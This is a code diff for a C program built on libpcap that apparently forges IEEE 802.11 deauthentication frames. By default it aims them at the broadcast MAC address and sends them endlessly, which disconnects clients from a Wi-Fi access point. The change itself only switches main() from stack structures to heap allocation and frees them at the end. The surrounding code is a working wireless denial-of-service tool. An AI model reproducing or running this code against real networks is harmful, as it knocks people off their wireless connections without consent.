@@ -50,6 +50,7 @@ void IEEE80211_frame_to_bytestr(IEEE80211_generic_t *pkt, uint8_t *outp)
     outp[25] = (pkt->reason_code >> 8) & 0xff;
     *((uint32_t*)(outp+26)) = pkt->fcs;
 }
+
 void set_deauth_fields(IEEE80211_generic_t *pkt)
 {
     if (pkt == NULL)
@@ -123,33 +124,42 @@ void IEEE80211_frame_send(IEEE80211_generic_t *client_pkt, IEEE80211_generic_t *
     free(ap_pkt_bytestr);
     free(client_pkt_bytestr); 
 }
+
 int main(int argc, char* argv[])
 {
     uint8_t iface[] = DEFAULT_IFACE;
     int64_t n_pkts = -1, args_iface = 0, args_ap_mac = 0, args_cl_mac = 0;
     
-    IEEE80211_generic_t  client_pkt = {};
-    IEEE80211_generic_t  ap_pkt = {};
+    //IEEE80211_generic_t  client_pkt = {};
+    //IEEE80211_generic_t  ap_pkt = {};
     
+    IEEE80211_generic_t *client_pkt;
+    IEEE80211_generic_t *ap_pkt;
+    client_pkt = (IEEE80211_generic_t*)malloc(sizeof(IEEE80211_generic_t));
+    ap_pkt = (IEEE80211_generic_t*)malloc(sizeof(IEEE80211_generic_t));
+    memset(ap_pkt, 0x00, sizeof(IEEE80211_generic_t));
+    memset(client_pkt, 0x00, sizeof(IEEE80211_generic_t));
     uint8_t cl_mac[] = BROADCAST_MAC;
     uint8_t ap_mac[] = BROADCAST_MAC;
     
-    mac_to_bytes(ap_mac, client_pkt.src_addr);
-    mac_to_bytes(ap_mac, client_pkt.bssid);
-    mac_to_bytes(ap_mac, ap_pkt.dest_addr);
-    mac_to_bytes(ap_mac, ap_pkt.bssid);
+    mac_to_bytes(ap_mac, client_pkt->src_addr);
+    mac_to_bytes(ap_mac, client_pkt->bssid);
+    mac_to_bytes(ap_mac, ap_pkt->dest_addr);
+    mac_to_bytes(ap_mac, ap_pkt->bssid);
 
-    mac_to_bytes(cl_mac, client_pkt.dest_addr);
-    mac_to_bytes(cl_mac, ap_pkt.src_addr);
+    mac_to_bytes(cl_mac, client_pkt->dest_addr);
+    mac_to_bytes(cl_mac, ap_pkt->src_addr);
     args_cl_mac = 1;
     n_pkts = -1;
-    preprocess_frames(&client_pkt, &ap_pkt);
+    preprocess_frames(client_pkt, ap_pkt);
     uint8_t errbuf[100];
     pcap_t *handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL)
 	printf("Error opening pcap handle: %s\n", errbuf);
-    IEEE80211_frame_send(&client_pkt, &ap_pkt, handle, n_pkts);
+    IEEE80211_frame_send(client_pkt, ap_pkt, handle, n_pkts);
     pcap_close(handle);
+    free(client_pkt);
+    free(ap_pkt);
     return 0;
 }
 #endif
